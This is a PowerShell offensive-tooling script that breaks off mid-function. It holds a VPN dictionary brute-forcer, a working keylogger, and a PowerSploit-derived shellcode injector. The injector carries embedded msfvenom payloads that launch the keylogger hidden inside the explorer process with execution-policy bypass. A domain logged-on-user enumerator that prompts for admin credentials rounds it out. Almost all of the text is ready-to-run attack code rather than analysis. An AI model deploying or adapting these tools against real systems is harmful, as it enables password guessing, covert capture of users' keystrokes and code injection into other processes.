function Invoke-VpnBruteForce{
<#
    .SYNOPSIS
    This Will Help You to launch an Dictionary attack to PPtP L2tp & Ikev2 Vpn.

    Author: Prince%00
        
    .PARAMETER Checkvpn
    Checking Vpn The Connections Made by you before attack 

    .PARAMETER UsernameFilePath
    The username file path.

    .PARAMETER PasswordFilePath
    The Password file path.

    .PARAMETER VPNType
    Your VPN connection type.

    .PARAMETER TunType
    Kind of tunnel encryption.

    .PARAMETER ServerAddress
    Your target server for Dictionary attack.

    .EXAMPLE
     Invoke-VpnBruteForce -ServerAddress 192.168.20.10 -UsernameFilePath C:\Usernames.txt -PasswordFilePath C:\Passwords.txt -TunType Pptp 

    .LINK
     https://github.com/Prince-Amir/Offensive-Powershell.git
#>
    [CmdletBinding()]param (

        [Parameter(Position = 1, Mandatory=$true)]
        [string]
        $ServerAddress,

        [Parameter(Position = 1, Mandatory=$true)]
        $UsernameFilePath,

        [Parameter(Position = 2, Mandatory=$true)]
        $PasswordFilePath,

        
       
        [Parameter(ParameterSetName = 'TunType', Mandatory=$true)]
        [Validateset('Pptp','L2tp','Ikev2','Automatic')]
        [Alias('tt')]
        [string]
        $TunType
        
        
        )


BEGIN{

    $UsernameFilePath = Get-Content $UsernameFilePath
    $PasswordFilePath = Get-Content $PasswordFilePath

    $Checkvpn = Get-VpnConnection
        
        if ($Checkvpn.ConnectionStatus -cmatch 'Connected'){

        echo '!!Your Connected By Your Bruter Connection First Disconnect!!'
        return}


        elseif ($Checkvpn.Name -match 'Bruter'){

            Set-VpnConnection -Name Bruter -ServerAddress $ServerAddress -TunnelType $TunType
            #'!!!Your Vpn Has Built Before Its Named Bruter You Can Change Your Config In [ControlPanel\Network and Internet\Network Connections]!!!'
        }
        else{

            Add-VpnConnection -name Bruter -ServerAddress $ServerAddress -TunnelType $TunType               
           
        }

}

PROCESS{

    
    foreach ($username in $UsernameFilePath){
    
            foreach($Password in $PasswordFilePath){
                
                    [string]$Connection =  rasdial "Bruter" $username $Password
                                                                 
                        if ($Connection -match 'error'  )
            
                            {Write-Host "[-]$username : $Password" -ForegroundColor red -BackgroundColor Black}
             
                        else
            
                            {echo '  YES !!!!!Your Username & Password Found!!!!!  '
                            echo [+]username: $UsernameFilePath[$x]
                            echo [+]password: $PasswordFilePath[$y]
                            exit}

            }

     }
   }   
}

function Start-KeyLogger($Path="$env:temp\keylogger.txt"){
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    # Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red
    # Write-Host "Your Keys Dumped In $env:temp" -ForegroundColor Red
    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40
      
      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
    }
  }
  finally
  {
    # open logger file in Notepad
    # notepad $Path
  }
}


function Invoke-ShellcodekeyLog{
<#
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):

msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
msfvenom -p windows/exec -a x86 CMD="PowerShell -windowstyle hidden -exec bypass C:\Best-KeyLogger.ps1" EXITFUNC=thread -f powershell
msfvenom -p windows/x64/exec -a x86 CMD="PowerShell -windowstyle hidden -exec bypass C:\Best-KeyLogger.ps1" EXITFUNC=thread -f powershell

Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
 
.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

C:\PS> Invoke-ShellcodekeyLog -ProcessId 4274

Description
-----------
Inject keylogger into process ID 4274.

.EXAMPLE

C:\PS> Invoke-Shellcode

Description
-----------
Inject keylogger into the explorer process of current login user.


Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
#>


[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID = $ExplorerPS,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Ensure a valid process ID was provided
        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitOS) # Only perform theses checks if CPU is 64-bit
        {
            # Determine if the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Shellcode injection targeting a 64-bit process from 32-bit PowerShell is not supported. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        Write-Verbose 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process

    $AddressWidth = $null

    try {
        $AddressWidth = @(Get-WmiObject -Query 'SELECT AddressWidth FROM Win32_Processor')[0] | Select-Object -ExpandProperty AddressWidth
    } catch {
        throw 'Unable to determine OS processor address width.'
    }

    switch ($AddressWidth) {
        '32' {
            $64bitOS = $False
        }

        '64' {
            $64bitOS = $True

            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
    	    $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        }

        default {
            throw 'Invalid OS address width detected.'
        }
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        # KeyLog For YOU ... or whatever shellcode you decide to place in here
        # Insert your shellcode here in the for 0xXX,0xXX,...
        # 32-bit payload
        # msfvenom -p windows/exec CMD="powershell -exec bypass C:\Best-KeyLogger.ps1" EXITFUNC=thread -f powershell
        [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,
                                0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,
                                0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,
                                0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,
                                0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,
                                0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,
                                0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,
                                0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,
                                0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,
                                0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,
                                0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,
                                0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,
                                0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,
                                0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x1,0x8d,
                                0x85,0xb2,0x0,0x0,0x0,0x50,0x68,0x31,0x8b,0x6f,
                                0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,
                                0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,
                                0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,
                                0x0,0x53,0xff,0xd5,0x50,0x6f,0x77,0x65,0x72,0x53,
                                0x68,0x65,0x6c,0x6c,0x20,0x2d,0x77,0x69,0x6e,0x64,
                                0x6f,0x77,0x73,0x74,0x79,0x6c,0x65,0x20,0x68,0x69,
                                0x64,0x64,0x65,0x6e,0x20,0x2d,0x65,0x78,0x65,0x63,
                                0x20,0x62,0x79,0x70,0x61,0x73,0x73,0x20,0x49,0x6d,
                                0x70,0x6f,0x72,0x74,0x2d,0x4d,0x6f,0x64,0x75,0x6c,
                                0x65,0x20,0x43,0x3a,0x5c,0x50,0x72,0x69,0x6e,0x63,
                                0x65,0x50,0x6f,0x77,0x65,0x72,0x2e,0x70,0x73,0x6d,
                                0x31,0x20,0x3b,0x20,0x53,0x74,0x61,0x72,0x74,0x2d,
                                0x4b,0x65,0x79,0x4c,0x6f,0x67,0x67,0x65,0x72,0x0)

        # 64-bit payload
        # msfvenom -p windows/x64/exec CMD="powershell -exec bypass C:\Best-KeyLogger.ps1" EXITFUNC=thread -f powershell
        [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,
                                0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,
                                0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
                                0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,
                                0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,
                                0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,
                                0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,
                                0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,
                                0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,
                                0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,
                                0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,
                                0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,
                                0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,
                                0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,
                                0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,
                                0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
                                0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,
                                0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,
                                0xff,0xff,0x5d,0x48,0xba,0x1,0x0,0x0,0x0,0x0,
                                0x0,0x0,0x0,0x48,0x8d,0x8d,0x1,0x1,0x0,0x0,
                                0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,
                                0x1d,0x2a,0xa,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,
                                0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,
                                0x0,0x59,0x41,0x89,0xda,0xff,0xd5,0x50,0x6f,0x77,
                                0x65,0x72,0x53,0x68,0x65,0x6c,0x6c,0x20,0x2d,0x77,
                                0x69,0x6e,0x64,0x6f,0x77,0x73,0x74,0x79,0x6c,0x65,
                                0x20,0x68,0x69,0x64,0x64,0x65,0x6e,0x20,0x2d,0x65,
                                0x78,0x65,0x63,0x20,0x62,0x79,0x70,0x61,0x73,0x73,
                                0x20,0x49,0x6d,0x70,0x6f,0x72,0x74,0x2d,0x4d,0x6f,
                                0x64,0x75,0x6c,0x65,0x20,0x43,0x3a,0x5c,0x50,0x72,
                                0x69,0x6e,0x63,0x65,0x50,0x6f,0x77,0x65,0x72,0x2e,
                                0x70,0x73,0x6d,0x31,0x20,0x3b,0x20,0x53,0x74,0x61,
                                0x72,0x74,0x2d,0x4b,0x65,0x79,0x4c,0x6f,0x67,0x67,
                                0x65,0x72,0x0)
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Inject shellcode into the specified process ID
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting shellcode into PID: $ProcessId"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!" ) )
        {
            Inject-RemoteShellcode $ProcessId
        }
    }
    else
    {
        # Inject shellcode into the currently running PowerShell process
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting shellcode into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting shellcode into the running PowerShell process!" ) )
        {
            Inject-LocalShellcode
        }
    }   
}
$ExplorerPS = Get-Process -Name explorer
[UInt16]$ExplorerPS = $ExplorerPS.Id

function PsLoggedon{
<#    [CmdletBinding()]param (

        [Parameter(Position = 1, Mandatory=$true)]
        [PSCredential]
        $Username,
        
        [Parameter(Position = 2, Mandatory=$true)]
        [PSCredential]
        $Password
        
               
       
        )
#>

<#
    .SYNOPSIS
    This Will Show you wich user works is in which computer (Be Aware use this just on Domain Controller) !!!

     Author: Prince%00
        
    .EXAMPLE
     PS>PsLoggedon 

    .LINK
     https://github.com/Prince-Amir/Offensive-Powershell
#>
    $key = “HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds”
    Set-ItemProperty $key ConsolePrompting True
    $Username = Read-Host "DomainAdminUsername "
    $Password = Read-Host "DomainAdminPassword " -AsSecureString
    $cred = new-object System.Management.Automation.PSCredential($Username,$Password)
    $computers = Get-ADComputer -Credential $cred -Filter {(enabled -eq "true") } | Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue 
    $output = @()
    Foreach ($PSItem in $computers){
        $User = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $PSItem | Select-Object -ExpandProperty Username
        $obj = New-Object -TypeName PSObject -Property @{
            "Computer" = $PSItem
            "User" = $User
        }
    $output+=$obj
    }
}

function NetworkStatus{
    [CmdletBinding()]param (

        [Parameter(Position = 1, Mandatory=$true)]
        $IPList       
        )

    BEGIN{$IPList = Get-Content $IPList}

    PROCESS{
        foreach ($ip in $IPList){
